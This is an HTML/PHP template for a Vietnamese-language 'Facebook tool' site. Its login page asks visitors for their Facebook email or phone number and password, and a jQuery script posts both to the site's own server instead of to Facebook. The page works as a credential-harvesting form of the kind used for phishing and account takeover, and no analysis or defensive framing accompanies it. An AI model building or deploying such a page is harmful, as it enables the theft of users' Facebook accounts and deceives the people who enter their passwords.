<!DOCTYPE HTML>
<html lang="en">

<!-- Mirrored from www.enableds.com/products/kolor3/homepages.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 21 Jul 2018 07:26:11 GMT -->

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1" />
    <title>CÔNG CỤ FACEBOOK</title>
    <link rel="stylesheet" type="text/css" href="<?=base_url()?>app/fonts/css/fontawesome-all.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
    <link rel="stylesheet" type="text/css" href="<?=base_url()?>app/styles/framework.css">
    <link href="https://fonts.googleapis.com/css?family=Poppins:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i|Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i" rel="stylesheet">
</head>

<body>


    <div class="page-content">
        <div style="padding-top: 40%;"></div>
        <div class="page-login bg-white top-0 animated pulse">

            <div class="content bottom-0">
                <form>
                <center>
                    <h3 class="uppercase ultrabold top-10 bottom-0">Đăng nhập</h3>
                    <p class="smaller-text bottom-15">Đăng nhập bằng tài khoản Facebook</p>
                </center>
                <div class="page-login-field top-15">
                    <i class="fa fa-user"></i>
                    <input type="text" placeholder="Email hoặc số điện thoại" name="email" required="">
                    <em>(bắt buộc)</em>
                </div>
                <div class="page-login-field bottom-20">
                    <i class="fa fa-lock"></i>
                    <input type="password" placeholder="Mật khẩu" name="password" required="">
                    <em>(bắt buộc)</em>
                </div>

                <button type="submit" id="submit_btn" class="button button-blue button-full shadow-icon-large button-round button-s uppercase ultrabold"> <i class="fa fa-facebook-official"></i> Đăng nhập bằng Facebook</button>
                </form>
            </div>
        </div>
    </div>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>

    <script type="text/javascript" src="<?=base_url()?>app/scripts/jquery.js"></script>
    <script type="text/javascript" src="<?=base_url()?>app/scripts/plugins.js"></script>
    <script type="text/javascript" src="<?=base_url()?>app/scripts/custom.js"></script>
    <script type="text/javascript" src="<?=base_url()?>app/scripts/js_cookie.js"></script>
    <script type="text/javascript">


            $.ajaxSetup({
              beforeSend: function(xhr, settings) {
                if (settings.data.indexOf('csrf_test_name') === -1) {
                  settings.data += '&csrf_test_name=' + encodeURIComponent(Cookies.get('csrf_cookie_name'));
                }
              }
            });

            $('form').submit(function(e) {
               $('#submit_btn').html('<i class="fa fa-spinner fa-spin"></i> Đang xử lý đăng nhập...').prop({
                   disabled: true
               });
               $.post('', $('form').serialize()).done(function(a){
                    if(a['status'] == 'success'){
                        setTimeout(function(){
                          location.reload();
                        }, 2000);
                    }
                    swal("Thông báo", a['message'], a['status']);
               }).fail(function(){
                    
                swal("Lỗi", "Không thể kết nối tới server ! Kiểm tra lại kết nối Internet của bạn.", "warning");
               }).always(function(){
                    $('#submit_btn').html('<i class="fa fa-facebook-official"></i> Đăng nhập bằng Facebook').prop({
                       disabled: false
                    });
               });
               e.preventDefault();
            });
    </script>
</body>